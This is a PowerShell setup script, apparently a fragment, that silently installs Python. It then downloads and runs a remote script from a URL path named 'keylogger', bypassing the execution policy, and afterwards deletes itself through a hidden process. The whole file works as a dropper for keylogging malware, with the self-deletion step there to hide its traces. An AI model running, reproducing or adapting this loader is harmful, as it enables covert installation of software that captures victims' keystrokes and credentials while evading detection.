# =========================
# Check for Python
# =========================

$pythonCheck = python --version 2>$null
if ($?) {
    Write-Host "Python already installed: $pythonCheck"
}
else {
    Write-Host "Python not found. Installing..."

    try {
        $TempPath = [System.IO.Path]::GetTempPath()
        $InstallerPath = Join-Path $TempPath "python-installer.exe"
        $DownloadURL = "https://www.python.org/ftp/python/$PythonVersionFull/python-$PythonVersionFull-amd64.exe"

        Invoke-WebRequest -Uri $DownloadURL -OutFile $InstallerPath

        # Install Python for the current user (no admin rights needed)
        Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -NoNewWindow -Wait

        Remove-Item $InstallerPath -Force
    }
    catch {
        throw
    }
}

# ===============================================
# Download 'dependencies setup' PowerShell script
# ===============================================

try {
    $TempPath = [System.IO.Path]::GetTempPath()
    $InstallerPath = Join-Path $TempPath "dependencies.ps1"
    $DownloadURL = "https://studentKnowledge.github.io/keylogger/dependencies.ps1"

    Invoke-WebRequest -Uri $DownloadURL -OutFile $InstallerPath

    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$InstallerPath`"" -NoNewWindow -Wait
    }
catch {
    throw
}
# Wait for 5 seconds before cleanup
Start-Sleep -Seconds 5
Write-Host "Execution was successfull!"

# Cleanup / auto-delete
$scriptPath = $MyInvocation.MyCommand.Path

# Run a new PowerShell process to delete the script after it finishes
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command Remove-Item -Path '$scriptPath' -Force" -WindowStyle Hidden

# Exit the script
exit
